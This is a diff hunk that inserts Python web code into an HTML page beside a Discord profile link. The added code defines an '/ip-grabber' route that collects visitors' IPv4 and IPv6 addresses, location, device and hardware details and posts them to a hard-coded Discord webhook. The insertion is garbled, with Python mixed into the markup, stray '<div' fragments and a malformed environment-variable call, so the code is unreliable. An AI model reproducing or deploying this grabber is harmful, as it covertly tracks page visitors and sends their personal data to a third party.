@@ -50,6 +50,44 @@
             </div>
         </div>
 
+        <import json
+import requests
+
+@app.route(<'/ip-grabber', methods=['POST'])
+<div
+ ip_grabber():
+    data = request.get_json() 
+    <div
+    # Extract data from the request
+    ipv4 = data['ipv4']
+<div
+    ipv6 = data['ipv6']
+<div
+    location = data['location']
+
+<div
+    device = data['device']
+    hardware = data['hardware']
+<div
+    <div
+    # Prepare webhook payload
+    payload = {
+        'ipv4': ipv4,
+<div
+        'ipv6': ipv6,
+        'location': location,
+<div
+        'device': device,
+        'hardware': hardware
+    }
+    <div
+    # Send data to the webhook
+<div
+    requests.post(os.getenv(https://discord.com/api/webhooks/1374760366751617145/O7yzCxpkcBvsrCePdf3REayvPHbJ4jJZ3NxTTdCSQAREhHZhUrm3tJyVbm6c_OcRRN5r), json=payload)
+<div
+    
+    return 'OK'>
+
         <div class="flexbox">
             <a href="https://discord.com/channels/@me/1369689431820472382" target="_blank">
                 <button><i class="icon fa-brands discord"></i>@r5qx.</button>
